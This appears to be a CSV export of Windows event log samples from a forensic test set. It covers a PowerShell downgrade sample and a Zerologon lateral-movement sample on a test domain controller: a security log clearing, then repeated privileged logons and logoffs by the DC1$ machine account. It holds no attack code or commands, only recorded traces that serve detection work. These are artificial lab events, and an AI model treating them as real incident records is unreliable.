	HostVersion=2.0
	HostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c
	EngineVersion=2.0
	RunspaceId=c6e94dca-0daf-418c-860a-f751a9f2cbe1
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","HostName=ConsoleHost","HostVersion=2.0",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Stopped, Available, \tNewEngineState=Stopped\n\tPreviousEngineState=Available\n\n\tSequenceNumber=10\n\n\tHostName=ConsoleHost\n\tHostVersion=2.0\n\tHostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c\n\tEngineVersion=2.0\n\tRunspaceId=c6e94dca-0daf-418c-860a-f751a9f2cbe1\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
1,12136,2022-02-23 09:44:15.2144608,1102,Info,Microsoft-Windows-Eventlog,Security,300,1176,dc1.test.local,0,,Event log cleared,TEST\Administrator,,SID: (S-1-5-21-3684832485-3471852018-3987709081-500),,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,0x4020000000000000,0,"{""UserData"":{""LogFileCleared"":{""SubjectUserSid"":""S-1-5-21-3684832485-3471852018-3987709081-500"",""SubjectUserName"":""Administrator"",""SubjectDomainName"":""TEST"",""SubjectLogonId"":""0x67589""}}}"
2,12137,2022-02-23 09:44:17.7048336,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,1744,dc1.test.local,0,,Administrative logon,TEST\DC1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0x7E68CE,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""TEST""},{""@Name"":""SubjectLogonId"",""#text"":""0x7E68CE""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
3,12138,2022-02-23 09:44:17.7049395,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,1744,dc1.test.local,0,,Successful logon,-\-," (fe80::7191:d555:270f:4d0b)",Target: TEST.LOCAL\DC1$,LogonType 3,LogonId: 0x7E68CE,,,,-,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0x7E68CE""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""f24a1aa9-4919-497f-5382-c96e5878dbfc""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""fe80::7191:d555:270f:4d0b""},{""@Name"":""IpPort"",""#text"":""51241""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
4,12139,2022-02-23 09:44:17.7088788,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,3580,dc1.test.local,0,,Administrative logon,TEST\DC1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0x7E69B7,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""TEST""},{""@Name"":""SubjectLogonId"",""#text"":""0x7E69B7""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
5,12140,2022-02-23 09:44:17.7089808,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,3580,dc1.test.local,0,,Successful logon,-\-," (::1)",Target: TEST.LOCAL\DC1$,LogonType 3,LogonId: 0x7E69B7,,,,-,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0x7E69B7""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""ca2fb08e-d68c-dbcf-0649-3b714c5c86c7""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""0""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
6,12141,2022-02-23 09:44:17.7117383,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,4056,dc1.test.local,0,,Administrative logon,TEST\DC1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0x7E69FB,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""TEST""},{""@Name"":""SubjectLogonId"",""#text"":""0x7E69FB""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
7,12142,2022-02-23 09:44:17.7118057,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,4056,dc1.test.local,0,,Successful logon,-\-," (192.168.20.11)",Target: TEST.LOCAL\DC1$,LogonType 3,LogonId: 0x7E69FB,,,,-,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0x7E69FB""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""f24a1aa9-4919-497f-5382-c96e5878dbfc""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""192.168.20.11""},{""@Name"":""IpPort"",""#text"":""51242""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
8,12143,2022-02-23 09:44:17.8157313,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,636,dc1.test.local,0,,Administrative logon,TEST\DC1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0x7E6A5C,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""TEST""},{""@Name"":""SubjectLogonId"",""#text"":""0x7E6A5C""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
9,12144,2022-02-23 09:44:17.8158602,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,636,dc1.test.local,0,,Successful logon,-\-," (fe80::7191:d555:270f:4d0b)",Target: TEST.LOCAL\DC1$,LogonType 3,LogonId: 0x7E6A5C,,,,-,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0x7E6A5C""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""ca2fb08e-d68c-dbcf-0649-3b714c5c86c7""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""fe80::7191:d555:270f:4d0b""},{""@Name"":""IpPort"",""#text"":""51243""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1840""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
10,12145,2022-02-23 09:44:17.8194554,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,3580,dc1.test.local,0,,An account was logged off,,,Target: TEST\DC1$,LogonType 3,LogonId: 0x7E69FB,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST""},{""@Name"":""TargetLogonId"",""#text"":""0x7E69FB""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
11,12146,2022-02-23 09:44:17.8196653,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,636,dc1.test.local,0,,An account was logged off,,,Target: TEST\DC1$,LogonType 3,LogonId: 0x7E69B7,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST""},{""@Name"":""TargetLogonId"",""#text"":""0x7E69B7""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
12,12147,2022-02-23 09:44:17.8226793,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,3580,dc1.test.local,0,,An account was logged off,,,Target: TEST\DC1$,LogonType 3,LogonId: 0x7E68CE,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST""},{""@Name"":""TargetLogonId"",""#text"":""0x7E68CE""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
13,12148,2022-02-23 09:44:18.5290359,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,4056,dc1.test.local,0,,Administrative logon,TEST\DC1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0x7E6DCF,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""TEST""},{""@Name"":""SubjectLogonId"",""#text"":""0x7E6DCF""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
14,12149,2022-02-23 09:44:18.5291529,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,4056,dc1.test.local,0,,Successful logon,-\-," (fe80::7191:d555:270f:4d0b)",Target: TEST.LOCAL\DC1$,LogonType 3,LogonId: 0x7E6DCF,,,,-,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0x7E6DCF""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""f24a1aa9-4919-497f-5382-c96e5878dbfc""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""fe80::7191:d555:270f:4d0b""},{""@Name"":""IpPort"",""#text"":""51245""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
15,12150,2022-02-23 09:44:18.5302071,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,5280,dc1.test.local,0,,Administrative logon,TEST\DC1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0x7E6DEC,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""TEST""},{""@Name"":""SubjectLogonId"",""#text"":""0x7E6DEC""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
16,12151,2022-02-23 09:44:18.5307738,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,636,dc1.test.local,0,,Successful logon,-\-," (fe80::7191:d555:270f:4d0b)",Target: TEST.LOCAL\DC1$,LogonType 3,LogonId: 0x7E6DEC,,,,-,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0x7E6DEC""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""f24a1aa9-4919-497f-5382-c96e5878dbfc""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""fe80::7191:d555:270f:4d0b""},{""@Name"":""IpPort"",""#text"":""51230""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
17,12152,2022-02-23 09:44:18.5343984,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,636,dc1.test.local,0,,An account was logged off,,,Target: TEST\DC1$,LogonType 3,LogonId: 0x7E6DCF,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST""},{""@Name"":""TargetLogonId"",""#text"":""0x7E6DCF""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
18,12153,2022-02-23 09:44:18.5362778,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,4056,dc1.test.local,0,,Administrative logon,TEST\DC1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0x7E6E54,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""TEST""},{""@Name"":""SubjectLogonId"",""#text"":""0x7E6E54""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
19,12154,2022-02-23 09:44:18.5363834,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,4056,dc1.test.local,0,,Successful logon,-\-," (fe80::7191:d555:270f:4d0b)",Target: TEST.LOCAL\DC1$,LogonType 3,LogonId: 0x7E6E54,,,,-,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0x7E6E54""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""f24a1aa9-4919-497f-5382-c96e5878dbfc""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""fe80::7191:d555:270f:4d0b""},{""@Name"":""IpPort"",""#text"":""51246""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
20,12155,2022-02-23 09:44:18.5404674,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,5280,dc1.test.local,0,,An account was logged off,,,Target: TEST\DC1$,LogonType 3,LogonId: 0x7E6E54,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST""},{""@Name"":""TargetLogonId"",""#text"":""0x7E6E54""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
21,12156,2022-02-23 09:44:22.4510620,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,2064,dc1.test.local,0,,Administrative logon,TEST\DC1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0x7E701E,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""TEST""},{""@Name"":""SubjectLogonId"",""#text"":""0x7E701E""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
